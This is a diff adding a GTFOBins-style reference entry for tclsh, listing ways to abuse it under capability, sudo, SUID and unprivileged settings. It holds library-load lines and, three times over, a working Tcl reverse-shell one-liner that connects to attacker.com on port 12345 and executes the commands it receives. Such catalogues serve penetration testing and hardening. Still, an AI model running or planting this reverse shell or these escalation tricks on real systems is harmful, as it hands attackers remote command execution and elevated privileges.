@@ -1,0 +1,48 @@
+tclsh
+=====
+
+Library load
+------------
+
+[Capabilities]
+    tclsh
+load /path/to/lib.so x
+
+[Sudo]
+    tclsh
+load /path/to/lib.so x
+
+[SUID]
+    tclsh
+load /path/to/lib.so x
+
+[Unprivileged]
+    tclsh
+load /path/to/lib.so x
+
+Reverse shell
+-------------
+
+[Sudo]
+    tclsh
+set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
+
+[SUID]
+    tclsh
+set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
+
+[Unprivileged]
+    tclsh
+set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
+
+Shell
+-----
+
+[Sudo]
+    tclsh
+
+[SUID]
+    tclsh
+
+[Unprivileged]
+    tclsh
